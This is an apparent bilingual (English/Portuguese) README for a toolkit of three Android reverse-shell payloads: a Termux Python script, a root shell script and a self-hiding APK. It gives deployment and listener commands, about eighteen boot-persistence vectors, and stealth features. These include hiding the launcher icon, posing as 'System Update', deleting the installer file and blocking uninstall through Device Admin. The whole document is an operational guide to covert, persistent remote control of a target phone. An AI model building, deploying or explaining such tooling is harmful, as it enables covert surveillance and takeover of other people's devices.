# rs — Android reverse shell with persistence

[English](#english) | [Português](#português)

---

# English

Collection of three reverse-shell payloads for Android, ordered by how much
access you have on the target. All of them are reverse shells: the target
connects **out** to your listener, so no port forwarding and no inbound rules
are needed.

```
Listener (you)                    Target (Android)
nc -lvnp 4444      <──────────    payload connects out every few seconds
```

## Layout

```
.
├── shell.py       # Python, Termux-first (also Windows / Linux / WSL)
├── rs.sh          # pure mksh/toybox, stock Android, root for boot persistence
└── rsapk/         # APK builder, self-hiding, no shell needed on target
    ├── build.sh
    ├── AndroidManifest.xml
    ├── res/xml/
    └── src/com/sys/core/
```

Pick one:

| Component | Target | Requires on target | Survives reboot |
|---|---|---|---|
| `shell.py` | Termux | Termux + Python + Termux:Boot | yes (Termux vectors) |
| `rs.sh` | stock Android | root + `toybox nc` | yes (root vectors only) |
| `rsapk` | stock Android | nothing | yes (BOOT_COMPLETED) |

## Listener

```sh
nc -lvnp 4444
```

`rs.sh` and the APK reconnect with a 4–12 s jitter. `shell.py` retries every 5 s.

## 1. `shell.py` — Termux

Install first:

```sh
pkg install python termux-api termux-services cronie
```

Then open the Termux:Boot app once (it only arms after first launch), and:

```sh
python shell.py 192.168.0.10:4444
```

Without the argument it prompts for IP and port, and caches the answer in
`~/.config/.revshell/endpoint` so boot scripts work without a TTY.

Persistence vectors applied, all idempotent:

| Vector | Path | Requirement |
|---|---|---|
| Termux:Boot | `~/.termux/boot/00-revshell` | Termux:Boot opened once |
| shell rc | `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zshrc` | none |
| profile.d | `$PREFIX/etc/profile.d/revshell.sh` | none |
| global rc | `$PREFIX/etc/bash.bashrc` | none |
| runit | `$PREFIX/var/service/revshell/run` | termux-services |
| crontab | `@reboot` entry | cronie |
| job scheduler | 15 min persistent job | termux-api |
| Tasker | `~/.termux/tasker/revshell.sh` | Termux:Tasker |

The payload is copied to `~/.config/.revshell/shell.py` first — running straight
from `/sdcard` fails on `noexec` and FUSE permissions.

Built-in remote commands: `help sysinfo tasks users netstat persist wake battery
cd exit`.

## 2. `rs.sh` — stock Android shell

```sh
adb push rs.sh /data/local/tmp/rs.sh
adb shell sh /data/local/tmp/rs.sh 192.168.0.10:4444
```

`/data/local/tmp` is `exec`-mounted, so the script runs without root. The payload
copies itself to `/data/local/tmp/.rs/rs.sh` and drives the shell over a FIFO
piped into `nc`.

Vectors, in order, all guarded and idempotent:

| Vector | Path | Requirement |
|---|---|---|
| Magisk module | `/data/adb/modules/rs/` | root + Magisk |
| service.d | `/data/adb/service.d/rs.sh` | root |
| post-fs-data.d | `/data/adb/post-fs-data.d/rs.sh` | root |
| KernelSU | `/data/adb/ksu/service.d/rs.sh` | root + KernelSU |
| APatch | `/data/adb/ap/service.d/rs.sh` | root + APatch |
| su.d | `/system/su.d`, `/su/su.d`, `/data/su.d` | legacy SuperSU |
| init.d | `/system/etc/init.d/rs`, `/etc/init.d/rs` | ROM with init.d |
| init .rc | `/system/etc/init/rs.rc` | root + remountable `/system` |
| crond | `/data/local/tmp/.rs/cron/root` | `toybox crond` |
| staging | `/data/local/tmp/.rs/rearm.sh` | always |

`persist` re-applies every vector from the remote session and `log` shows what
landed. Only `ok` means it worked.

**Without root there is no boot persistence at all on stock Android.** The only
thing left is `rearm.sh`, re-armed manually over `adb shell` or wireless
debugging.

## 3. `rsapk` — self-hiding APK

Build on an x86_64 machine with JDK 17 and Android build-tools:

```sh
sudo apt install -y openjdk-17-jdk-headless unzip wget
export ANDROID_HOME=$HOME/Android/Sdk
mkdir -p "$ANDROID_HOME/cmdline-tools"
cd "$ANDROID_HOME/cmdline-tools"
wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
unzip -q commandlinetools-linux-11076708_latest.zip
mv cmdline-tools latest
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH"
yes | sdkmanager --sdk_root="$ANDROID_HOME" --licenses
sdkmanager --sdk_root="$ANDROID_HOME" platform-tools platforms\;android-33 build-tools\;34.0.0
```

Then:

```sh
HOST=192.168.0.10 PORT=4444 ./build.sh
adb install -r rs.apk
```

Open the app once. It finishes immediately, the icon disappears, and the shell
service starts.

The `mv cmdline-tools latest` is mandatory — `sdkmanager` only resolves from
`cmdline-tools/latest/`.

Three hiding layers:

1. **Launcher** — the only activity is disabled through
   `setComponentEnabledSetting(..., DONT_KILL_APP)` on first run. No root needed.
2. **Settings → Apps** — `pm hide com.sys.core` (root or adb). Hidden apps are
   not relaunched by BOOT_COMPLETED, so chain it with the `service.d` hook above.
3. **The APK file** — copied to `/data/local/tmp/.rs/base.apk`, matching files in
   `Download/` deleted.

Unhide:

```sh
adb shell pm enable com.sys.core/.MainActivity
adb shell pm unhide com.sys.core
```

Survival mechanisms: `BOOT_COMPLETED` + `MY_PACKAGE_REPLACED` receiver,
`JobScheduler` 15 min persistent job, `AlarmManager` inexact repeat, a system
account (survives "Clear data"), and a `DeviceAdminReceiver` that blocks
uninstall from the UI.

Remote commands: `!hide !unhide !hidepkg !unhidepkg !path !persist`.

Label is `System Update` and the icon is `@android:drawable/sym_def_app_icon`, so
it blends into Settings.

## Caveats

- The APK needs `targetSdk 33`. At 34+ a `foregroundServiceType` is mandatory and
  the manifest as written is rejected.
- Android 13+ shows the foreground-service notification. It is required — without
  it the socket dies in minutes. `IMPORTANCE_LOW` keeps it silent and collapsed.
- `pm uninstall` over adb bypasses Device Admin entirely.
- The account survives "Clear data", not uninstall, and is per-user.
- `toybox crond` is not reliable across versions; `@reboot` may be ignored. It is
  last in the queue on purpose and never a dependency.
- `rs.rc` under `/system/etc/init` is the most fragile vector — A/B devices and
  `dm-verity` can revert it on OTA. The Magisk module is the only one that
  survives a system update.
- `aapt2` is x86_64. It does not run on ARM, including Termux without proot.
- `shell.py` under Termux is the only component that works on non-rooted devices
  with real boot persistence.

## Cleanup

```sh
# Termux
rm -rf ~/.config/.revshell ~/.termux/boot/00-revshell

# stock Android
rm -rf /data/local/tmp/.rs
rm -f /data/adb/service.d/rs.sh /data/adb/post-fs-data.d/rs.sh
rm -rf /data/adb/modules/rs

# APK
adb uninstall com.sys.core
```

## Credits

Original `shell.py`: [github.com/wrxxnch](https://github.com/wrxxnch).

License: MIT.

---

# Português

Três payloads de reverse shell para Android, ordenados por quanto acesso você tem
no alvo. Todos são reverse shell: o alvo conecta **para fora**, então não há
redirecionamento de porta nem regra de entrada.

```
Listener (você)                   Alvo (Android)
nc -lvnp 4444      <──────────    payload conecta a cada poucos segundos
```

## Estrutura

```
.
├── shell.py       # Python, foco em Termux (também Windows / Linux / WSL)
├── rs.sh          # mksh/toybox puro, Android stock, root para persistência
└── rsapk/         # gerador de APK, auto-escondido, sem shell no alvo
    ├── build.sh
    ├── AndroidManifest.xml
    ├── res/xml/
    └── src/com/sys/core/
```

Escolha um:

| Componente | Alvo | Exige no alvo | Sobrevive a reboot |
|---|---|---|---|
| `shell.py` | Termux | Termux + Python + Termux:Boot | sim (vetores Termux) |
| `rs.sh` | Android stock | root + `toybox nc` | sim (só vetores root) |
| `rsapk` | Android stock | nada | sim (BOOT_COMPLETED) |

## Listener

```sh
nc -lvnp 4444
```

`rs.sh` e o APK reconectam com jitter de 4–12 s. `shell.py` tenta a cada 5 s.

## 1. `shell.py` — Termux

Instale antes:

```sh
pkg install python termux-api termux-services cronie
```

Abra o app Termux:Boot uma vez (ele só arma após o primeiro start) e rode:

```sh
python shell.py 192.168.0.10:4444
```

Sem o argumento ele pergunta IP e porta, e guarda a resposta em
`~/.config/.revshell/endpoint` para os scripts de boot funcionarem sem TTY.

Vetores aplicados, todos idempotentes:

| Vetor | Caminho | Requisito |
|---|---|---|
| Termux:Boot | `~/.termux/boot/00-revshell` | Termux:Boot aberto 1x |
| rc de shell | `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zshrc` | nenhum |
| profile.d | `$PREFIX/etc/profile.d/revshell.sh` | nenhum |
| rc global | `$PREFIX/etc/bash.bashrc` | nenhum |
| runit | `$PREFIX/var/service/revshell/run` | termux-services |
| crontab | entrada `@reboot` | cronie |
| job scheduler | job persistente de 15 min | termux-api |
| Tasker | `~/.termux/tasker/revshell.sh` | Termux:Tasker |

O payload é copiado para `~/.config/.revshell/shell.py` antes de tudo — rodar
direto de `/sdcard` falha por `noexec` e permissões FUSE.

Comandos remotos: `help sysinfo tasks users netstat persist wake battery cd exit`.

## 2. `rs.sh` — shell padrão do Android

```sh
adb push rs.sh /data/local/tmp/rs.sh
adb shell sh /data/local/tmp/rs.sh 192.168.0.10:4444
```

`/data/local/tmp` é montado `exec`, então o script roda sem root. O payload se
copia para `/data/local/tmp/.rs/rs.sh` e dirige o shell por um FIFO ligado ao
`nc`.

Vetores, em ordem, todos guardados e idempotentes:

| Vetor | Caminho | Requisito |
|---|---|---|
| Módulo Magisk | `/data/adb/modules/rs/` | root + Magisk |
| service.d | `/data/adb/service.d/rs.sh` | root |
| post-fs-data.d | `/data/adb/post-fs-data.d/rs.sh` | root |
| KernelSU | `/data/adb/ksu/service.d/rs.sh` | root + KernelSU |
| APatch | `/data/adb/ap/service.d/rs.sh` | root + APatch |
| su.d | `/system/su.d`, `/su/su.d`, `/data/su.d` | SuperSU legado |
| init.d | `/system/etc/init.d/rs`, `/etc/init.d/rs` | ROM com init.d |
| init .rc | `/system/etc/init/rs.rc` | root + `/system` remontável |
| crond | `/data/local/tmp/.rs/cron/root` | `toybox crond` |
| staging | `/data/local/tmp/.rs/rearm.sh` | sempre |

`persist` reaplica todos os vetores pela sessão remota e `log` mostra o que
pegou. Só `ok` significa que funcionou.

**Sem root não existe persistência de boot em Android stock.** Sobra o
`rearm.sh`, rearmado na mão via `adb shell` ou Debug sem fio.

## 3. `rsapk` — APK auto-escondido

Compile em máquina x86_64 com JDK 17 e build-tools:

```sh
sudo apt install -y openjdk-17-jdk-headless unzip wget
export ANDROID_HOME=$HOME/Android/Sdk
mkdir -p "$ANDROID_HOME/cmdline-tools"
cd "$ANDROID_HOME/cmdline-tools"
wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
unzip -q commandlinetools-linux-11076708_latest.zip
mv cmdline-tools latest
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH"
yes | sdkmanager --sdk_root="$ANDROID_HOME" --licenses
sdkmanager --sdk_root="$ANDROID_HOME" platform-tools platforms\;android-33 build-tools\;34.0.0
```

Depois:

```sh
HOST=192.168.0.10 PORT=4444 ./build.sh
adb install -r rs.apk
```

Abra o app uma vez. Ele fecha na hora, o ícone desaparece e o serviço de shell
sobe.

O `mv cmdline-tools latest` é obrigatório — o `sdkmanager` só resolve a partir de
`cmdline-tools/latest/`.

Três camadas de ocultação:

1. **Launcher** — a única activity é desabilitada via
   `setComponentEnabledSetting(..., DONT_KILL_APP)` no primeiro start. Sem root.
2. **Configurações → Apps** — `pm hide com.sys.core` (root ou adb). App oculto não
   é relançado pelo BOOT_COMPLETED, então encadeie com o hook `service.d` acima.
3. **O arquivo APK** — copiado para `/data/local/tmp/.rs/base.apk`, com remoção
   dos arquivos correspondentes em `Download/`.

Reexibir:

```sh
adb shell pm enable com.sys.core/.MainActivity
adb shell pm unhide com.sys.core
```

Mecanismos de sobrevivência: receiver de `BOOT_COMPLETED` +
`MY_PACKAGE_REPLACED`, job persistente de 15 min no `JobScheduler`, repetição
inexata no `AlarmManager`, conta de sistema (sobrevive a "Limpar dados") e
`DeviceAdminReceiver` que bloqueia desinstalação pela UI.

Comandos remotos: `!hide !unhide !hidepkg !unhidepkg !path !persist`.

O rótulo é `System Update` e o ícone é `@android:drawable/sym_def_app_icon`, para
se misturar nas Configurações.

## Limites

- O APK precisa de `targetSdk 33`. Em 34+ o `foregroundServiceType` é obrigatório
  e o manifest como está é rejeitado.
- Android 13+ exibe a notificação do foreground service. Ela é necessária — sem
  isso o socket morre em minutos. `IMPORTANCE_LOW` mantém silenciosa e recolhida.
- `pm uninstall` via adb ignora o Device Admin.
- A conta sobrevive a "Limpar dados", não a desinstalar, e é por usuário.
- `toybox crond` não é confiável entre versões; `@reboot` pode ser ignorado. É o
  último da fila de propósito e nunca dependência.
- `rs.rc` em `/system/etc/init` é o vetor mais frágil — aparelhos A/B e
  `dm-verity` podem revertê-lo em OTA. O módulo Magisk é o único que sobrevive a
  update do sistema.
- `aapt2` é x86_64. Não roda em ARM, inclusive Termux sem proot.
- `shell.py` no Termux é o único componente que funciona em aparelho sem root com
  persistência de boot real.

## Limpeza

```sh
# Termux
rm -rf ~/.config/.revshell ~/.termux/boot/00-revshell

# Android stock
rm -rf /data/local/tmp/.rs
rm -f /data/adb/service.d/rs.sh /data/adb/post-fs-data.d/rs.sh
rm -rf /data/adb/modules/rs

# APK
adb uninstall com.sys.core
```

## Créditos

`shell.py` original: [github.com/wrxxnch](https://github.com/wrxxnch).

Licença: MIT.